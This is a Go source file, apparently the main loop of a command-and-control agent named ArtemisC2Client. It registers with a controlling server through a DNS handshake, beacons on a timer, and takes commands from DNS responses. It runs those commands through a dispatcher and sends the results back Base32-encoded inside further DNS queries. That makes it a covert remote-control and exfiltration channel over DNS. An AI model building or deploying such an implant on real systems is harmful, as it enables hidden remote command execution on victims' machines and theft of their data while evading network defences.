package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/desertcod98/ArtemisC2Client/commands"
	"github.com/desertcod98/ArtemisC2Client/config"
	"github.com/desertcod98/ArtemisC2Client/dns"
	"github.com/desertcod98/ArtemisC2Client/encoding"
	"github.com/desertcod98/ArtemisC2Client/utils"
)

func main() {
	cfg, configErr := config.LoadConfig()

	if configErr != nil {
		agentId, handshakeErr := doHandshake()
		if handshakeErr != nil {
			fmt.Println("Handshake error:", handshakeErr)
			return
		}
		cfg.AgentId = agentId
		cfg.BeaconInterval = 10 // seconds
		config.SaveConfig(cfg)
	}

	ctx := initContext(cfg)
	cmdDispatcher := commands.NewDispatcher(ctx)

	fmt.Println("Agent id:", cfg.AgentId)

	ticker := time.NewTicker(time.Duration(cfg.BeaconInterval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			doBeacon(cfg, cmdDispatcher)
		case newBeaconInterval := <-ctx.SetBeaconIntervalCh:
			ticker.Stop()
			cfg.BeaconInterval = newBeaconInterval
			config.SaveConfig(cfg)
			fmt.Println("[INFO] Changed beacon interval to " + strconv.Itoa(newBeaconInterval))
			ticker = time.NewTicker(time.Duration(newBeaconInterval) * time.Second)
		}
	}
}

func doHandshake() (string, error) {
	var agentId string
	handshakeRes, handshakeErr := dns.DnsQuery("handshake")
	if handshakeErr != nil {
		return agentId, handshakeErr
	}
	fmt.Println("Handhsake job id:", handshakeRes)

	return dns.DnsQuery(handshakeRes)
}

func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command) {
	beaconRes, beaconErr := dns.DnsQuery(cfg.AgentId + ".Beacon")
	if beaconErr != nil {
		fmt.Println("Error:", beaconErr)
		return
	}
	fmt.Println("Beacon response:", beaconRes)

	commandSplit := strings.Split(beaconRes, ".")
	if len(commandSplit) < 2 {
		return
	}

	utils.ReverseStringArr(commandSplit)
	job := commandSplit[0]
	commandType := commandSplit[1]
	commandArgs := commandSplit[2:]

	if cmd, ok := cmdDispatcher[strings.ToLower(commandType)]; ok {
		resultChan := cmd.Execute(commandArgs)
		result := <-resultChan
		dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
	}
}

func initContext(cfg *config.Config) *config.Context {
	return &config.Context{
		Config:              cfg,
		SetBeaconIntervalCh: make(chan int, 1),
	}
}


